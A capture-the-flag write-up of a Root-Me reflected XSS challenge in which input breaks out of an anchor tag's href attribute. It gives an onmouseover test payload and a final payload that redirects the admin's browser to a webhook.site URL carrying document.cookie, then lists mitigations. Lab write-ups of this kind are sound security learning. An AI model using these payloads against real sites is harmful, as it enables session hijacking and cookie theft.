# XSS - Reflected (Attribute Injection)

**Date:** March 20, 2026  
**Platform:** Root-Me  
**Difficulty:** Easy  
**Category:** Web / Client-Side  

## 📝 Executive Summary
This challenge demonstrates a reflected Cross-Site Scripting (XSS) vulnerability via HTML attribute injection. By breaking out of an existing `<a>` tag attribute, I was able to inject a malicious event handler to steal the administrator's session cookie without requiring a direct click.

## 🔍 Initial Analysis
The challenge description provided a critical hint: 
> "The administrator does not click strange links."

This implies that a standard `<script>` tag or an `href="javascript:..."` payload might be ineffective or easily filtered. We need a payload that executes automatically or through passive interaction, such as a mouse hover.

### Identification
The vulnerable endpoint was identified at:
`http://challenge01.root-me.org/web-client/ch26/?p=contact`

The parameter `?p=` is reflected directly into the source code. Upon inspection, I found the input lands inside an anchor tag attribute:
`<a href='[INJECTION_HERE]'>Contact</a>`

## 🚀 Exploitation

### 1. Attribute Breakout
Since the input is wrapped in single quotes, I used a single quote (`'`) to terminate the `href` attribute and injected a new event handler.

**Test Payload:**
`' onmouseover='alert("XSS")`

**Resulting HTML:**
`<a href='' onmouseover='alert("XSS")'>Contact</a>`

The browser successfully rendered the new attribute, and hovering over the link triggered the alert box, confirming the vulnerability.

### 2. Cookie Exfiltration
To capture the flag, I needed to exfiltrate the `document.cookie` to an attacker-controlled server (Webhook). 

**Final Payload:**
```javascript
' onmouseover='document.location=`https://webhook.site/YOUR-ID?c=`.concat(document.cookie)
```

**Execution Flow:**
1. The payload is sent to the "Report to Administrator" feature.
2. The Admin visits the page.
3. As the Admin moves their mouse to navigate (no click required), the `onmouseover` event triggers.
4. The browser is forced to redirect to my Webhook, appending the Admin's session cookie as a URL parameter.


## 🛠️ Mitigation & Lessons Learned
1. **Context-Aware Encoding:** The application should use an HTML entity encoder specifically designed for attributes. In this case, single quotes should be encoded as `&#39;` or `&apos;`.
2. **Content Security Policy (CSP):** Implementing a strict CSP that disallows inline scripts and `eval()` would have mitigated this attack, even if the injection was successful.
3. **Input Validation:** Use a whitelist of allowed paths for the `?p=` parameter instead of reflecting raw user input.
